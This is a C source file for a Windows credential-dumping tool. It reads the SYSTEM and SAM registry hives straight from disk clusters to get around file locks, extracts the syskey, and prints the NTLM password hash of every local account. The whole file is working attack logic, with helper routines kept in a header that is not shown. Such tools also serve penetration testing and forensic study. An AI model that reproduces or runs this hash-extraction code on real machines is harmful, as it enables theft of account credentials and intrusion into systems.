
#include "Includes.h"
//#include "Registry.h"
//#include "SAM.h"

int wmain(int argc, wchar_t *argv[])
{

	BOOL success = FALSE;

	wchar_t* username = 0;
	BYTE syskey[16];
	BYTE hashed_syskey[32];
	//BYTE hashed_ntlm[16];
	BYTE ntlm[16];
	DWORD rid = 0;
	DWORD rids_count = 0;
	char** rids = 0;

	BOOL isWow64;
	void* old_value;
	success = IsWow64Process(GetCurrentProcess(), &isWow64);

	if (isWow64)
	{
		Wow64DisableWow64FsRedirection(&old_value);
	}

	// Getting the hives file cluster layout and dumping them from the disk
	FILE_CLUSTER_LAYOUT* system_fcl = GetFileClusters(L"C:\\Windows\\System32\\Config\\SYSTEM");
	BYTE* system_hive = DumpFileFromDisk(system_fcl);
	free(system_fcl);

	FILE_CLUSTER_LAYOUT* sam_fcl = GetFileClusters(L"C:\\Windows\\System32\\Config\\SAM");
	BYTE* sam_hive = DumpFileFromDisk(sam_fcl);
	free(sam_fcl);

	if (system_hive == NULL || sam_hive == NULL)
	{
		wprintf(L"Error Dumping hive files - Run as Administartor\n");
		return 1;
	}

	success = SAM_Initialize();

	success = GetSyskey(system_hive, syskey);

	success = GetHashedSyskey(sam_hive, syskey, hashed_syskey);
	
	rids_count = GetSubkeyNamesList(sam_hive, "SAM\\Domains\\Account\\Users\\", &rids);

	for (unsigned i = 0; i < rids_count; i++)
	{

		if (_stricmp(rids[i], "Names"))
		{

			success = GetNTLMHash(sam_hive, hashed_syskey, rids[i], ntlm, &username);

			wprintf(L"%s - ", username);
			if (success)
			{
				for (int i = 0; i < 16; i++)
				{
					wprintf(L"%02x", ntlm[i]);
				}
			}
			else
			{
				wprintf(L"No Password?");
			}
			wprintf(L"\n");

			free(username);
			
		}

	}


	for (unsigned int i = 0; i < rids_count; i++)
	{
		free(rids[i]);
	}
	free(rids);
	free(system_hive);
	free(sam_hive);

	SAM_Uninitialize();

	return 0;
}